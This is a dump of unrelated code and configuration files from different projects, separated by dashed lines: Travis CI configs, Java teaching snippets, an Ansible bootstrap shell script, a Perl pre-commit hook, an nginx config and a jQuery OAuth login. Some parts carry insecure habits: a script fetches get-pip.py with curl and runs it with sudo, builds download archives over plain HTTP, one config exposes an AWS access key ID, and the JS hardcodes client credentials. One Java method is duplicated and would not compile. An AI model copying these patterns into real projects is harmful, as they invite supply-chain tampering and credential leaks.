  - $HOME/.gradle/caches/
  - $HOME/.gradle/wrapper/
  - $HOME/.rvm/

after_success:
- |
  if [[ "${DO_AFTER_SUCCESS}" == "true" ]]
  then
    # Start uploading in the background while SonarQube runs
    travis-custom-deploy sftp build/distributions/*.zip build/libs/*-all.jar &
    
    git fetch --unshallow
    ./gradlew sonarqube --info --stacktrace --warning-mode=all
    
    wait # Wait for travis-custom-deploy (started in the background) to finish
  fi
--------------------------------------------------------------------------------------------------------
language: java
jdk:
- oraclejdk8
env:
  global:
    secure: Uo89ZmbGNHfVXZYRXMnGRmD3CSHnKl5CmB3gbOCqSmWEAmnb5vwtmigKa5kqzCXa4qHH78GhB/zQuhjY5rbXUFpam1+t08JFgspkSLZ7i1W70vrdN14hwMI0bk7l6nM0hAxnnkViutzNGn3ejqRHmGIJc5VGRR+1MyBGSAzI8lUfx5FPzbB4mmHCDG4g1D6csKPfzXUisGdtK4Xdrk+UNoh4W5+15B1As1YaQBl9hkGSjjo3IB+dPBbER2TXviTxjokWENpia7iVGuhnCEU3zpvv1yEwZ7u6s1NNfu9SU/c1/JtBTZU51Qxes6Ja3B92wWXw8jSbxbuxHu3kZ0sFwg60V1K1+JV6prDZqc8/nlwX9DSR1FgMmcFCPG/VrpCbxrBGvCJTNBWkOidMZTR6Sl5PAVwp0uwz5lWAV3DISAV0jMPTsG4ZJaa5MSKOspl1AzZUx72nljjUUNW/KCCIR2Ntxn0xgJVbAdsLFnRB00T/UhcePhpTHAUpuSfxZdMdGUSPCU5b8zEzkpe7lY49GPVPX6zh3dfdRqnATWgKPS7FhTbu8xEyiBD9D6+jMwycwBh6XPhDCEPtBYuvsGhIPDKV/yqyf18PH0eDypcvLRwCNDRhCcRiIEerhU0mAjYZrq7WSpj8GZ7e0Yjs+GFWACcHkGZv6QP3e0xFanJp+o8=

before_install:
- openssl aes-256-cbc -pass pass:$ENCRYPTION_PASSWORD -in secring.gpg.enc -out secring.gpg -d
- openssl aes-256-cbc -pass pass:$ENCRYPTION_PASSWORD -in pubring.gpg.enc -out pubring.gpg -d
- openssl aes-256-cbc -pass pass:$ENCRYPTION_PASSWORD -in gradle.properties.enc -out gradle.properties -d

install: /bin/true

sudo: false

script: TERM=dumb gradle clean build uploadArchives
--------------------------------------------------------------------------------------------------------
@RequestMapping(value = "/appoint/{bookId}/{userNumber}/{holdDay}", method = RequestMethod.GET, produces = "text/plain;charset=UTF-8")
  @ResponseBody
--------------------------------------------------------------------------------------------------------

    public static void testExecutorService() {

        Employee employee = new Employee("John", 2000);

        ExecutorService executor = Executors.newFixedThreadPool(10);

        Callable<Double> callableTask = () -> {
            return employeeService.calculateBonus(employee);
        };
        Future<Double> future = executor.submit(callableTask);

        try {
            if (future.isDone()) {
                double result = future.get();
                System.out.println("Bonus is:" + result);
            }
        } catch (InterruptedException | ExecutionException e) {
            e.printStackTrace();
        }

        executor.shutdown();
    }
	
	
    public static void testScheduledExecutorService() {
        Employee employee = new Employee("John", 2000);

        ScheduledExecutorService executor = Executors.newScheduledThreadPool(10);

        Callable<Double> callableTask = () -> {
            return employeeService.calculateBonus(employee);
        };

        Future<Double> futureScheduled = executor.schedule(callableTask, 2, TimeUnit.MILLISECONDS);

        try {
            System.out.println("Bonus:" + futureScheduled.get());
        } catch (InterruptedException | ExecutionException e) {
            e.printStackTrace();
        }

        executor.scheduleAtFixedRate(() -> System.out.println("Fixed Rate Scheduled"), 2, 2000, TimeUnit.MILLISECONDS);
        executor.scheduleWithFixedDelay(() -> System.out.println("Fixed Delay Scheduled"), 2, 2000, TimeUnit.MILLISECONDS);
    }

    public static void testThreadPoolExecutor() {
        ThreadPoolExecutor fixedPoolExecutor = (ThreadPoolExecutor) Executors.newFixedThreadPool(10);
        ThreadPoolExecutor cachedPoolExecutor = (ThreadPoolExecutor) Executors.newCachedThreadPool();

        ThreadPoolExecutor executor = new ThreadPoolExecutor(4, 6, 60, TimeUnit.SECONDS, new LinkedBlockingQueue<Runnable>());
        executor.setMaximumPoolSize(8);

        ScheduledThreadPoolExecutor scheduledExecutor = (ScheduledThreadPoolExecutor) Executors.newScheduledThreadPool(5);
    }
   public static void testThreadPoolExecutor() {
        ThreadPoolExecutor fixedPoolExecutor = (ThreadPoolExecutor) Executors.newFixedThreadPool(10);
        ThreadPoolExecutor cachedPoolExecutor = (ThreadPoolExecutor) Executors.newCachedThreadPool();

        ThreadPoolExecutor executor = new ThreadPoolExecutor(4, 6, 60, TimeUnit.SECONDS, new LinkedBlockingQueue<Runnable>());
        executor.setMaximumPoolSize(8);

        ScheduledThreadPoolExecutor scheduledExecutor = (ScheduledThreadPoolExecutor) Executors.newScheduledThreadPool(5);
    }
--------------------------------------------------------------------------------------------------------
import lombok.Builder;

class ClientBuilder {

    @Builder(builderMethodName = "builder")
    public static ImmutableClient newClient(int id, String name) {
        return new ImmutableClient(id, name);
    }
}
--------------------------------------------------------------------------------------------------------
import lombok.Builder;
import lombok.Getter;

@Getter
@Builder(toBuilder = true)
public class Widget {

    private final String name;
    private final int id;

}
--------------------------------------------------------------------------------------------------------
public class PrimitiveBundleInitialized {
    // @formatter:off
    public byte byteValue       = (byte) 1;
    public short shortValue     = (short) 1;
    public int intValue         = 1;
    public long longValue       = 1L;
    public float floatValue     = 1.0f;
    public double doubleValue   = 1;
    // @formatter:on

    public String toString() {
        return "{" + "byte: " + byteValue + ", " + "short: " + shortValue + ", "
            + "int: " + intValue + ", " + "long: " + longValue + ", "
            + "float: " + floatValue + ", " + "double: " + doubleValue + "}";
    }
}
import javax.jws.WebMethod;
import javax.jws.WebService;
import javax.jws.soap.SOAPBinding;

import com.stackify.models.User;
import com.stackify.models.Users;

@WebService
@SOAPBinding(style = SOAPBinding.Style.RPC)
public interface UserService {

    @WebMethod
    public void addUser(User user);

    @WebMethod
    public Users getUsers();
}
--------------------------------------------------------------------------------------------------------
https://www.baeldung.com/hibernate-custom-types
https://github.com/eugenp/tutorials/tree/master/persistence-modules/hibernate5/src/main/java/com/baeldung/hibernate
--------------------------------------------------------------------------------------------------------
import org.hibernate.boot.model.naming.Identifier;
import org.hibernate.boot.model.naming.PhysicalNamingStrategy;
import org.hibernate.engine.jdbc.env.spi.JdbcEnvironment;

public class CustomPhysicalNamingStrategy implements PhysicalNamingStrategy {

    @Override
    public Identifier toPhysicalCatalogName(final Identifier identifier, final JdbcEnvironment jdbcEnv) {
        return convertToSnakeCase(identifier);
    }

    @Override
    public Identifier toPhysicalColumnName(final Identifier identifier, final JdbcEnvironment jdbcEnv) {
        return convertToSnakeCase(identifier);
    }

    @Override
    public Identifier toPhysicalSchemaName(final Identifier identifier, final JdbcEnvironment jdbcEnv) {
        return convertToSnakeCase(identifier);
    }

    @Override
    public Identifier toPhysicalSequenceName(final Identifier identifier, final JdbcEnvironment jdbcEnv) {
        return convertToSnakeCase(identifier);
    }

    @Override
    public Identifier toPhysicalTableName(final Identifier identifier, final JdbcEnvironment jdbcEnv) {
        return convertToSnakeCase(identifier);
    }

    private Identifier convertToSnakeCase(final Identifier identifier) {
        if (identifier == null) {
            return identifier;
        }

        final String regex = "([a-z])([A-Z])";
        final String replacement = "$1_$2";
        final String newName = identifier.getText()
            .replaceAll(regex, replacement)
            .toLowerCase();
        return Identifier.toIdentifier(newName);
    }

}
© 2019 GitHub
--------------------------------------------------------------------------------------------------------
#!/bin/sh

java -Dspring.profiles.active=$1 -Dlogging.config=/logback.xml -jar /app.war
--------------------------------------------------------------------------------------------------------
language: java
script: mvn -f de.stups.hhu.rodinaxiompos.parent/pom.xml clean verify
after_success: find de.stups.hhu.rodinaxiompos.repository/target/repository/ -type
  f -exec curl -u $FTP_USER:$FTP_PASS --ftp-create-dirs -T {} ftp://cobra.cs.uni-duesseldorf.de/upload/{}
  \;
env:
  global:
  - secure: bwv/3hWtR2pWCZnFt1D6L7A0VIk9WT4UDYJ3BsguAz4oj5IThMDWOz0c6dTv0thUvnX5Ri9xOACINas/88qGTIcJopEL/wjA/yAWkUwHQTO1VrAK3q2g2jINhJ8Rehz2BLWbWwmkvVMP5iqQv4FjURhvNBiE9uCemqjvsyvo+j2Ks/PvCS1KhL7yaSe+oeHMFAL0+yF/zXowa/c3kyEeBZ+DRtETmD8wAKkrH+gAVrK0x3IfDrUGFjW2eury89pxJXA1ZhwxaR4wXUbbahMeaUWvuVUUmCx9Zct1HHBBTR1oCn+V43K+eAexcTJYIxp4i3PIiTqpxpsyPPDyL9RQO0Rrz2z8nr7vJg03RW5+j+K23l8Fbi3hzme+yAFvoKyTZyBOtgApZw3Dr8r85+Kg6IgqhT+QwCeEIHMIr0/QYL491kjsjuO/ms/tV1ZR0aIy/v0Yw0sGBHXYF17TEpN+P7BCKp2kMziibfdgEqx1H5Gdi/7Td1n5xwRCYFTqFp6EKZ55zAToijoy7FLlXGq8jtWM6clGbiq0bOSQFVyhysJh6Si+dR2v78JFnZJr7rYm9DVto5+YfCxNPrhwrZTzsewKONBZWQ2qNupHstBrTkmyDfmdX4WOWyU+GDyoILCIkfsUXWlRLIa3gYNOV+efn1dTaYzXSueL8GZJ/4Blueg=
  - secure: NSuz3qsT3ICsldVT3py6RlE74AZRxaWX8vJ/qmA0jP8zGtURzc2W1QomnGA49uUKEqQEGqzwT+T0dqcQrOZeOx0axcZVLBxNEVFJK5llTfNLigwfO5+RJta3CDlyd3TglA36McefqLMTfvQ+P2LbsCNgPZUmF8yPSYumaqBQkLVqR1RW8if8yCj00UoTe8GoFSjkOIy1DxIYaLQd32OeVBW+914eYirekMcdbw5iu9qK/Say3WOOkwA9Qjz/y4HGLOcVQ/+nbzumGKgUflEeP+DEHBN66uK9hA2Wx7NmfiF1kukjksjwROU9/BXA44BcWUEUOQXCRFaiVOgq5KCoBOfIltFCgWqtOR0o7z1Xjir7cWX6AvXJxQ+2qJlovfJ+lgzOQEPz1VcC5BFZ4GfGamNNP7dJap1j90xHvNIixblRoiV4vi0c0Kp9tHazCiO3TY/8ubHh6sie3PQQAeIjiakau4u0o8pv7RovQTp4ycVdlTTIvMKJlcI2/3gQ+TgMcDE1G+2bHIn5oNSp8eujZbEZUSm04V5ksJ4PSQenfJsFQ5wv6IHz2F9qn+7vJLqpogc93RUNhJzH9qZcOzN2GRi7EYrDga/oljE1TbSGOmGkrW+OeUIMCDhMDo7XHTaThm7yiAq0EPmhkdau6gMLTveYwyQofIYGvLLtaML27I0=
--------------------------------------------------------------------------------------------------------
git config --global push.default simple
--------------------------------------------------------------------------------------------------------
import de.tototec.cmdoption.CmdOption;

import java.util.LinkedList;
import java.util.List;

public class CmdlineConfig {

    @CmdOption(names = {"--help", "-h"}, description = "Show this help")
    boolean help = false;

    @CmdOption(args = "FILE", description = "File to open", maxCount = -1)
    final List<String> files = new LinkedList<String>();
}
--------------------------------------------------------------------------------------------------------
#!/bin/bash -e
# Usage: bootstrap.sh <ansible_version>
# - Trying to install pip 
# - Trying to install virtualenv
# - Creating virtualenv for target ansible version in $SAVE_PATH
# - Entering to virtualenv
# - Trying to install ansible and libs 
# - Saving source with new ansible to ~/.bashrc 


SAVE_PATH=~/.checkstyle/
LIBS='boto3'

# default version of 
TARGET_ANSIBLE_VERSION=latest

echo_green(){
	echo -e "\033[0;32m$@\033[0m"
}
echo_red(){
	echo -e "\033[0;31m$@\033[0m"
}
echo_lgreen(){
	echo -e "\033[1;32m$@\033[0m"
}
echo_yellow(){
	echo -e "\033[1;33m$@\033[0m"
}
echo_help(){
	cat <<EOF
Usage: $(basename $0) [ OPTION ] [ ansible_version ]
Options:
--not-persistent | Do not save version in environment
--remove-source  | Remove autoload from environment
EOF
}
echo_instructions(){
	COMMAND="exec bash"
	[[ ! -z $ANSIBLE_NOT_PERSISTENT ]] && COMMAND="VIRTUAL_ENV_DISABLE_PROMPT=1 source $SAVE_PATH/ansible_$CURRENT_ANSIBLE_VERSION/bin/activate"
	echo_lgreen To load ansible==$CURRENT_ANSIBLE_VERSION run command:
	echo_yellow $COMMAND
}

exist() {
	type $1 > /dev/null 2>&1
}
mutate_version(){
	local a=$1
	[[ $a == "" ]] || [[ $a == latest ]] && echo $a && return
	while [[ ${#a} -lt 7 ]]
	do
		a+=".0"
	done
	echo $a
}
exec_and_echo(){
	echo $@
	$@ && echo_green DONE && return 0
	echo_red ERROR
	return 1
}
rollback(){
	echo_green ROLLBACK
	exec_and_echo rm -rf $SAVE_PATH/ansible_$TARGET_ANSIBLE_VERSION
	exit 1
}
save_to_bashrc(){
	str="VIRTUAL_ENV_DISABLE_PROMPT=1 source $SAVE_PATH/ansible_$CURRENT_ANSIBLE_VERSION/bin/activate #checkstyle_ansible"
	remove_from_bashrc
	echo $str >> ~/.bashrc
	echo_lgreen Ansible version saved in your environment. To cancel it run:
	echo_yellow "$0 --remove-source"
}
remove_from_bashrc(){
	exec_and_echo sed -i '/#checkstyle_ansible/d' ~/.bashrc
}
post_install(){
	[[ -z $ANSIBLE_NOT_PERSISTENT ]] && save_to_bashrc || remove_from_bashrc
	echo_instructions
}

# args parser
while (($#))
do
	arg=$1
	case $arg in
		# remove persistent source
		--remove-source|-rs)
			remove_from_bashrc
			exit 0
		;;
		# remove persistent source
		--not-persistent|-np)
			ANSIBLE_NOT_PERSISTENT=1
		;;
		# mini help
		help|'?'|h|--help|-h)
			echo_help
			exit 0
		;;
		# version of ansible
		*)
			TARGET_ANSIBLE_VERSION=$arg
		;;
	esac
	shift
done

# parsing TARGET_ANSIBLE_VERSION - ansible version X.X.X.X or X.X.X or X.X or latest
TARGET_ANSIBLE_VERSION=$( mutate_version $TARGET_ANSIBLE_VERSION )
if [[ ! $TARGET_ANSIBLE_VERSION =~ ^[0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2}$ ]] && [[ $TARGET_ANSIBLE_VERSION != latest ]]
then
	echo_red Wrong arg format
	echo_help
	exit 1
fi

echo_green TARGET_ANSIBLE_VERSION $TARGET_ANSIBLE_VERSION
echo_green LIBS $LIBS

# disable virtualenv
exist deactivate && exec_and_echo deactivate && echo_green previous virtualenv deactivated

[[ ${SAVE_PATH:${#SAVE_PATH}-1} == '/' ]] && SAVE_PATH=${SAVE_PATH::${#SAVE_PATH}-1}

# Installation of pip
if ! exist pip 
then
	MNGR=$(
		( exist apt && echo apt ) ||
		( exist yum && echo yum ) ||
		( exist apt-get && echo apt-get )
	)
	# installation from repo
	if [[ ! -z $MNGR ]]
	then
		echo_green Detected $MNGR manager
		exec_and_echo $( [[ $UID != 0 ]] && echo sudo ) $MNGR -y -q install curl python-pip
	fi
	# installation by external script
	if ! exist pip && exist curl
	then
		exec_and_echo curl --silent "https://bootstrap.pypa.io/get-pip.py" -o "get-pip.py"
		exec_and_echo $( [[ $UID != 0 ]] && echo sudo ) python get-pip.py
		exec_and_echo rm -f get-pip.py
	fi
	# no other ways =(
	if ! exist pip
	then
		echo_red Can not install pip
		exit 1
	fi
fi

# virtualenv installation
if [[ ! -f ~/.local/bin/virtualenv ]]
then
	echo_green virtualenv installation
	exec_and_echo pip -q install --user virtualenv
	if [[ ! -f ~/.local/bin/virtualenv ]]
	then
		echo_red Can not install virtualenv
		exit 1
	fi
fi

# try to get latest version number
TARGET_LATEST=0
if [[ $TARGET_ANSIBLE_VERSION == latest ]]
then
	TARGET_LATEST=1
	TARGET_ANSIBLE_VERSION=$( pip search ansible | grep '^ansible ' | head -n1 | sed s/[^0-9\.]//g )
	TARGET_ANSIBLE_VERSION=$( mutate_version $TARGET_ANSIBLE_VERSION )
fi

# all files puts in dir $SAVE_PATH 
[[ ! -d $SAVE_PATH ]] && exec_and_echo mkdir $SAVE_PATH

# enter to virtualenv
exec_and_echo ~/.local/bin/virtualenv -q $SAVE_PATH/ansible_$TARGET_ANSIBLE_VERSION || rollback
exec_and_echo source $SAVE_PATH/ansible_$TARGET_ANSIBLE_VERSION/bin/activate

# check if needed ansible is already installed 
CURRENT_ANSIBLE_VERSION=Unknown
exist ansible && CURRENT_ANSIBLE_VERSION=$( ansible --version | head -1 | cut -d' ' -f 2 )
CURRENT_ANSIBLE_VERSION=$( mutate_version $CURRENT_ANSIBLE_VERSION )

if [[ $CURRENT_ANSIBLE_VERSION == $TARGET_ANSIBLE_VERSION ]] &&
	[[ -f $SAVE_PATH/ansible_$TARGET_ANSIBLE_VERSION/.libs_list ]] &&
	[[ $( cat $SAVE_PATH/ansible_$TARGET_ANSIBLE_VERSION/.libs_list ) == $LIBS ]]
then
	post_install
	exit 0
fi

# install ansible and libs
exec_and_echo pip -q install ansible==$TARGET_ANSIBLE_VERSION $LIBS || rollback
echo $LIBS > $SAVE_PATH/ansible_$TARGET_ANSIBLE_VERSION/.libs_list

# check installation 
CURRENT_ANSIBLE_VERSION=$( exist ansible && ansible --version | head -1 | cut -d' ' -f 2 )
CURRENT_ANSIBLE_VERSION=$( mutate_version $CURRENT_ANSIBLE_VERSION )

[[ $CURRENT_ANSIBLE_VERSION != $TARGET_ANSIBLE_VERSION ]] && rollback

post_install
exit 0
--------------------------------------------------------------------------------------------------------
#!/usr/bin/perl
#
# Pre-commit hook for running checkstyle on changed Java sources
#
# To use this you need:
# 1. checkstyle's jar file somewhere
# 2. a checkstyle XML check file somewhere
# 3. To configure git:
#   * git config --add checkstyle.jar <location of jar>
#   * git config --add checkstyle.checkfile <location of checkfile>
#   * git config --add java.command <path to java executale> [optional
#     defaults to assuming it's in your path]
# 4. Put this in your .git/hooks directory as pre-commit
#
# Now, when you commit, you will be disallowed from doing so
# until you pass your checkstyle checks.

$command = "git-diff-index --cached HEAD 2>&1 | sed 's/^:.*     //' | uniq";
open (FILES,$command . "|") || die "Cannot run '$command': $!\n";

$CONFIG_CHECK_FILE = "checkstyle.checkfile";
$CONFIG_JAR = "checkstyle.jar";
$CONFIG_JAVA = "java.command";

$check_file = `git config --get $CONFIG_CHECK_FILE`;
$checkstyle_jar = `git config --get $CONFIG_JAR`;
$java_command = `git config --get $CONFIG_JAVA`;

if (!$check_file || !$checkstyle_jar)
{
   die "You must configure checkstyle in your git config:\n"
   . "\t$CONFIG_CHECK_FILE - path to your checkstyle.xml file\n"
   . "\t$CONFIG_JAR - path to your checkstyle jar file\n"
   . "\t$CONFIG_JAVA - path to your java executable (optional)\n"
   ;
}

$java_command = "java" if (!$java_command);

chomp $check_file;
chomp $checkstyle_jar;
chomp $java_command;

$command = "$java_command -jar $checkstyle_jar -c $check_file";

@java_files = ();

foreach (<FILES>)
{
   chomp;
   next if (!(/\.java$/));
   push @java_files,$_;
   $command .= " ";
   $command .= $_;
}
if ($#java_files >= 0)
{
   if (&run_and_log_system ($command))
   {
       print STDERR "Commit aborted.\n";
       exit -1;
   }
}

exit 0;

sub run_and_log_system
{
   ($cmd) = @_;

   system $cmd;
}
--------------------------------------------------------------------------------------------------------
sudo: false
language: java
jdk:
- oraclejdk8
os:
- linux
addons:
  apt:
    packages:
    - oracle-java8-installer
script: mvn clean install -Pinstall-runtime
before_script:
- wget http://download-aws.ej-technologies.com/install4j/install4j_unix_6_1_6.tar.gz
- tar zxvf install4j_unix_6_1_6.tar.gz
- wget -O /home/travis/build/asciidocfx/AsciidocFX/install4j6.1.6/jres/linux-amd64-1.8.0_112.tar.gz http://kodedu.com/asciidocfx/jres/linux-amd64-1.8.0_112.tar.gz
- wget -O /home/travis/build/asciidocfx/AsciidocFX/install4j6.1.6/jres/macosx-amd64-1.8.0_152.tar.gz http://kodedu.com/asciidocfx/jres/macosx-amd64-1.8.0_152.tar.gz
- wget -O /home/travis/build/asciidocfx/AsciidocFX/install4j6.1.6/jres/windows-amd64-1.8.0_152.tar.gz http://kodedu.com/asciidocfx/jres/windows-amd64-1.8.0_152.tar.gz
- mvn clean
- mvn install4j:install-license
deploy:
- provider: releases
  skip_cleanup: true
  api_key:
    secure: L4y+3fi/yVR7guv7cynzrTOjRbE4+JTK79Fv5J8IQFwtzTP4V2GeW5ZjTdZXAlsFRvak5zhxY4OEYbYI2/riMib5Ea/K28Fd0F/nK8bUDddzxyXPc8zj6VrQINJX8Na2KfPvXT2UR+LtUWkK5HjeR+O/YQPTO4M+7SDGx5P+gog=
  file:
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Mac.dmg"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Linux.tar.gz"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Linux_No_JRE.tar.gz"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows.exe"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows_No_JRE.exe"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows.zip"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows_No_JRE.zip"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/asciidocfx-1.5.9.zip"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/updates.xml"
  on:
    tags: true
    all_branches: true
    repo: asciidocfx/AsciidocFX
- provider: s3
  skip_cleanup: true
  access_key_id: AKIAIHHVKYJLE6JUVEMA
  secret_access_key:
    secure: u3AfnEBb4o1boHzYsbPBlYqsxkKKWd4e02sabTLB7RRojgW1PpvGpvMCEZQ7EdziAfqJV2qZAI4ayYen36t2S0P9LMtt8NbnSO9RSF41Na+cGlsetbHgbejjK3QC5wM18j263gaxlM6uKD9wbO9VYaujYE6r66UUGdrQkNZh9xc=
  bucket: asciidoc-fx
  acl: public_read
  local_dir: "/home/travis/build/asciidocfx/AsciidocFX/target/media"
  file:
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Mac.dmg"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Linux.tar.gz"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Linux_No_JRE.tar.gz"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows.exe"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows_No_JRE.exe"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows.zip"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows_No_JRE.zip"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/asciidocfx-1.5.9.zip"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/updates.xml"
  on:
    tags: true
    all_branches: true
    repo: asciidocfx/AsciidocFX
env:
  global:
  - secure: x4NoL51Uq5eGy+qYR3R5ca5J16lXN+45EwcRTE3FBxzxN91vK6GrKW8sbjZLTXeEIjhn9X1IEe8A2ljh4fnkOtIGl2bVHm8KJPNWa/EKmCLZ7KjCzXtyI5743pb+IJpIyCaevwasTBGFvsrs3NOsV/zipk0nEu08VdqEvp7AsXE=
  - secure: xfIJj1AUhUgXfrMZStwGv0njAc8eSPe38M+QOyApgl1LriEc2WX0vdf/zQhcELHmuAidkDV6t4KCQ6IavzylvYHbrSL3Ki7uTIf1qWKPkJKJq0yhOON4Qw44sziM9ePAMLu09C6sOzXkcIYw8VJGQA4Dh8OxiKUePX0wqUw9zIY=
--------------------------------------------------------------------------------------------------------
user  nginx;
worker_processes  1;

error_log  /var/log/nginx/error.log warn;
pid        /var/run/nginx.pid;


events {
    worker_connections  1024;
}


http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  /var/log/nginx/access.log  main;

    sendfile        on;
    #tcp_nopush     on;

    keepalive_timeout  65;

    #gzip  on;

    include /etc/nginx/domain.conf;
}
--------------------------------------------------------------------------------------------------------
    var oauthToken = null;

    function login() {
        var userLogin = $('#loginField').val();
        var userPassword = $('#passwordField').val();
        console.log ( '#someButton was clicked' );
        $.post({
            url: 'http://localhost:8080/app/rest/v2/oauth/token',
            headers: {
                'Authorization': 'Basic Y2xpZW50OnNlY3JldA==',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            dataType: 'json',
            data: {grant_type: 'password', username: userLogin, password: userPassword},
            success: function (data) {
                oauthToken = data.access_token;
                $('#loggedInStatus').show();
                $('#loginForm').hide();
                loadRecentOrders();
            }
        })
    }

    function loadRecentOrders() {
        $.get({
            url: 'http://localhost:8080/app/rest/v2/entities/workshop$Order?view=_local',
            headers: {
                'Authorization': 'Bearer ' + oauthToken,
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            success: function (data) {
                $('#recentOrders').show();
                $.each(data, function (i, order) {
                    $('#ordersList').append("<li>" + order.description + "</li>");
                });
            }
        });
    }
--------------------------------------------------------------------------------------------------------
    // Using commonPool()
    // -Djava.util.concurrent.ForkJoinPool.common.parallelism=n
    // Caller policy
    static void parallel() {
//        System.setProperty("java.util.concurrent.ForkJoinPool.common.parallelism", "3");
        System.out.println(String.format("parallel() on %d threads. Available CPU: %d\n",
                ForkJoinPool.commonPool().getParallelism(), Runtime.getRuntime().availableProcessors()));

        int result = IntStream.range(0, 5)
                .parallel()
                .peek(it -> System.out.printf("Thread [%s] peek: %d\n", Thread.currentThread().getName(), it))
                .sum();
        System.out.println("sum: " + result);
    }

    static void pool() throws Exception {
        System.out.println("pool()");
        ForkJoinPool fjPool = new ForkJoinPool(2);
        fjPool.submit(() -> {
            int result = IntStream.range(0, 5)
                    .parallel()
                    .peek(it -> System.out.printf("Thread [%s] peek: %d\n", Thread.currentThread().getName(), it))
                    .sum();
            System.out.println("sum: " + result);
        });
        fjPool.awaitTermination(1, TimeUnit.SECONDS);
    }
--------------------------------------------------------------------------------------------------------
    static double getAvgMark(List<Student> students) {
        OptionalDouble avg = students.stream()
                .filter(st -> st.getCourse() == 5)
                .mapToDouble(st -> st.getAvgMark()) // Есть специальные стримы DoubleStream/IntStream/LongStream
                .average();

        return avg.orElse(0.0);
    }
--------------------------------------------------------------------------------------------------------
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.List;
import java.util.function.Function;

/**
 * Изобретаем свои лямбды
 */
public class FunctionExample {


    // Integer -> Double
    static class SquareRoot implements Function<Integer, Double> {
        @Override
        public Double apply(Integer val) {
            return Math.sqrt(val);
        }
    }

    static Double mySqrt(Integer val) {
        return Math.sqrt(val);
    }

    // Трансформация каждого элемента
    static <T, R> Collection<R> map(Collection<T> src, Function<T, R> op) {
        List<R> r = new ArrayList<>();
        for (T t : src) {
            r.add(op.apply(t));
        }
        return r;
    }

    public static void main(String[] args) {
        List<Integer> list = Arrays.asList(4, 8, 16, 25);
        System.out.println(map(list, new SquareRoot()));

        System.out.println(map(list, e -> Math.sqrt(e)));

        System.out.println(map(list, (Function<Integer, Double>) Math::sqrt));


        Function<Integer, Double> func1 = v -> mySqrt(v);
        // mySqrt() is Integer -> Double so it can be referenced as Function<Double, Integer>
        Function<Integer, Double> func2 = FunctionExample::mySqrt;
    }

}
--------------------------------------------------------------------------------------------------------
import com.esotericsoftware.yamlbeans.YamlException;
import com.esotericsoftware.yamlbeans.YamlReader;

import java.io.*;
import java.util.ArrayList;

/**
 * Loads the Notification Manager configuration establish on the
 * notifications.yaml file.
 * Created by luisburgos on 6/11/15.
 */
public class NotificationManagerConfigurator {

    private static final String FILE_PATH = "notifications.yaml";

    /**
     * @return an instance of PushNotificationManager generated fromo the
     * configuration file.
     */
    public static PushNotificationManager createNotificationManagerFromConfigFile() {

        File file = new File((ClassLoader.getSystemResource(FILE_PATH).getFile()));
        YamlReader reader = null;
        PushNotificationManager notificationManager = null;
        try {
            reader = new YamlReader(new FileReader(file));
            notificationManager = reader.read(PushNotificationManager.class);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (YamlException e) {
            e.printStackTrace();
        }
        return notificationManager;
    }
}
--------------------------------------------------------------------------------------------------------
sudo: required
dist: trusty

language: java
jdk:
  - oraclejdk8
  - oraclejdk7
  - openjdk7

matrix:
  allow_failures:
    - jdk: oraclejdk7
    - jdk: openjdk7
cache:
  directories:
    - $HOME/.m2

before_script:
  - export DISPLAY=:99.0
  - sh -e /etc/init.d/xvfb start
  - sleep 10 # give xvfb some time to start
  - wget http://download.netbeans.org/netbeans/8.1/final/zip/netbeans-8.1-201510222201.zip -O netbeans.zip
  - unzip -q netbeans.zip
    #- mvn -q dependency:get -Dartifact=junit:junit:4.8.2 -DrepoUrl=http://repo1.maven.org/maven2/
  # To reduce amout of log
  - cd maven-wrapper/ && mvn -q install && cd ..

script:
  - ant -Dnbplatform.nb81.netbeans.dest.dir=$PWD/netbeans -Dnbplatform.nb81.harness.dir=$PWD/netbeans/harness -Dfork=true test

notifications:
  slack:
    secure: RAYLit1PKRmeWYeEonVh9oFlFpL6PP9t6aulpLqa3/RYOR/CYZjkDvPxhNOOyPnPfxNojA16xp4grgU8q0F5vUBQ3FpLsyBIl3JMAFtyBPbdKK8/F2ZClWZMBLE2qf13FqJtNEnLu3btBVP1sB8MOrGmiyn+2wHQdwWytAMyzdE=
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import javax.websocket.EncodeException;
import javax.websocket.OnClose;
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.Session;
import javax.websocket.server.ServerEndpoint;
import objetos.DecoderMensaje;
import objetos.EncoderMensaje;
import objetos.Mensaje;

@ServerEndpoint(value="/chat", encoders = {EncoderMensaje.class}, 
                                decoders = {DecoderMensaje.class})
public class MiChat {
    
    private static final List<Session> conectados = new ArrayList<>();
    
    @OnOpen
    public void inicio(Session sesion){
        conectados.add(sesion);
    }
    
    @OnClose
    public void salir(Session sesion){
        conectados.remove(sesion);
    }
